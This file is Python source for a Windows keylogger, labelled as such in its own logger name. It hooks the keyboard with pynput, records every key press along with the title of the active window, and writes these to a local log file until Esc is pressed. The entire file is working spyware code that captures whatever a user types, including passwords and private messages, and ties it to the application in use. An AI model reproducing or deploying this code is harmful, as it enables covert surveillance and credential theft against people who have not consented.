from pynput.keyboard import Key, Listener

import logging

from win32gui import GetWindowText, GetForegroundWindow

logging.basicConfig(filename='YoYo.log', filemode='w', level=logging.INFO)
logger = logging.getLogger("My Keylogger")
logger.setLevel(logging.INFO)
count=0
keys=[]

class keylogger():
    def __init__(self):
        global logger
        self.lastApp,self.lastactivewindow = self.getActiveWindow()
        logger.info(self.lastactivewindow)
        self.currentApp,self.currentactivewindow = None,None


    def getActiveWindow(self):
        lastactivewindow=GetWindowText(GetForegroundWindow())
        if lastactivewindow[0]=='●':
                lastactivewindow=lastactivewindow[2:]

        splitterCount= lastactivewindow.count('-')
        if lastactivewindow.count('-')==0:
            lastApp=lastactivewindow
        else:
            lastApp=lastactivewindow.split('-')[splitterCount]
        return lastApp,lastactivewindow

    def checkCurrentWindow(self):
        if self.currentactivewindow!=self.lastactivewindow:
            logger.info(self.currentactivewindow)
            logger.info("-"*50)
            self.lastactivewindow=self.currentactivewindow

    
    def on_press(self,key):
        global keys,count,logger
        self.currentApp,self.currentactivewindow=self.getActiveWindow()
        self.checkCurrentWindow()
        
        logger.info("{0}pressed".format(key)) 

    def write_file(self,keys):
        with open("log.txt", "a") as f:
            for key in keys:
                f.write(key) 

    def on_release(self,key):
        if key== Key.esc:
            return False
    
    def start(self):

        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join() 

if __name__=="__main__":
    keylog=keylogger()
    keylog.start()


